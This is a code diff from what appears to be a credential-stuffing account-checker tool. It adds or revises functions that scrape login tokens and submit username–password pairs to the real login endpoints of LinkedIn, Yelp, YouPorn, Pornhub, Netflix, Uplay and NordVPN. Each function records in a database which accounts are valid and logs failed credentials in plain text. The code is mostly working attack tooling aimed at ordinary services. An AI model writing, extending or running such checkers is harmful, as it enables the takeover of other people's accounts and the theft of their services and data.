@@ -20,10 +20,65 @@ import logging as log
 #                                 data={"username": usr, "password": pwd, "csrf_token": csrf},
 #                                 cookies=cookies)
 #     print(res.content)
-#
 
-def youporn(usr,pwd,mr):
-    mr : ManageRequests
+
+def linkedin(usr : str, pwd : str, mr : ManageRequest):
+    get_url = "https://www.linkedin.com/login"
+    post_url = "https://www.linkedin.com/checkpoint/lg/login-submit"
+
+    # Get main page with tokens
+    res = mr.req.get(get_url, headers={'User-Agent': 'Mozilla/5.0'})
+    # Filter out tokens
+    soup = BeautifulSoup(res.text, features="html.parser")
+    csrfToken = soup.find('input', attrs={'name': 'csrfToken'})['value']
+    sIdString = soup.find('input', attrs={'name': 'sIdString'})['value']
+    loginCsrfParam = soup.find('input', attrs={'name': 'loginCsrfParam'})['value']
+
+    # Post request to login
+    res = mr.post_with_checks(post_url,
+                              data={'session_key': usr,
+                                    'session_password': pwd,
+                                    'csrfToken': csrfToken,
+                                    'sIdString': sIdString,
+                                    'loginCsrfParam': loginCsrfParam,
+                                    })
+
+    if 'login' not in res.url:
+        mr.db.update_result(usr, pwd, "linkedin", "True")
+        log.info("Account valid {}".format(usr))
+    else:
+        mr.db.update_result(usr, pwd, "linkedin", "False")
+        log.info("Account error {} {}".format(usr, pwd))
+    log.info("-------------------------------")
+    mr.req.cookies.clear()
+
+
+def yelp(usr : str, pwd : str, mr : ManageRequest):
+   site_url = "https://www.yelp.co.uk/login"
+
+    # Get main page with csrftok
+    res = mr.req.get(site_url, headers={'User-Agent': 'Mozilla/5.0'})
+    # Filter out csrftok value
+    soup = BeautifulSoup(res.text, features="html.parser")
+    csrftok = soup.find('form', id='ajax-login').find('input', 'csrftok')['value']
+
+    # Post request to login
+    res = mr.post_with_checks(site_url,
+                              data={'email': usr,
+                                    'password': pwd,
+                                    'csrftok': csrftok
+                                    })
+
+    if 'login' not in res.url:
+        mr.db.update_result(usr, pwd, "yelp", "True")
+        log.info("Account valid {}".format(usr))
+    else:
+        mr.db.update_result(usr, pwd, "yelp", "False")
+        log.info("Account error {} {}".format(usr, pwd))
+    log.info("-------------------------------")
+    mr.req.cookies.clear()
+
+def youporn(usr : str, pwd : str, mr : ManageRequest):
     post_url = "https://www.youporn.com/login/"
     # Post request to login
     res = mr.post_with_checks(post_url,
@@ -38,12 +93,12 @@ def youporn(usr,pwd,mr):
     else:
         mr.db.update_result(usr, pwd, "youporn", "True")
         log.info("Account valid {}".format(usr))
+
     log.info("-------------------------------")
     mr.req.cookies.clear()
 
 
-def pornhub(usr, pwd, mr):
-    mr : ManageRequests
+def pornhub(usr : str, pwd : str, mr : ManageRequest):
     post_url = "https://www.pornhub.com/front/authenticate"
     get_url = "https://www.pornhub.com/"
 
@@ -63,7 +118,7 @@ def pornhub(usr, pwd, mr):
                                     'remember_me': '0',
                                     'from': 'pc_login_modal_:index',
                                     'redirect': redirect,
-                                    'token': token,
+                                    'token': token
                                     })
 
     if int(json.loads(res.content)["success"]) == 1:
@@ -75,8 +130,8 @@ def pornhub(usr, pwd, mr):
     log.info("-------------------------------")
     mr.req.cookies.clear()
 
-def netflix(usr, pwd, mr):
-    mr : ManageRequests
+
+def netflix(usr : str, pwd : str, mr : ManageRequest):
     site_url = "https://www.netflix.com/Login"
 
     # Get login page with authURL
@@ -108,8 +163,7 @@ def netflix(usr, pwd, mr):
     mr.req.cookies.clear()
 
 
-def uplay(usr, pwd, mr):
-    mr: ManageRequests
+def uplay(usr : str, pwd : str, mr : ManageRequest):
     usr: str
     pwd: str
     site_post = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
@@ -134,7 +188,7 @@ def uplay(usr, pwd, mr):
     mr.req.cookies.clear()
 
 
-def nordvpn(usr, pwd, mr):
+def nordvpn(usr : str, pwd : str, mr : ManageRequest):
     """
     Custom functions must have 3 params: username and password to check, and a ManageRequests object
     The MR object has all the primitives that you need.
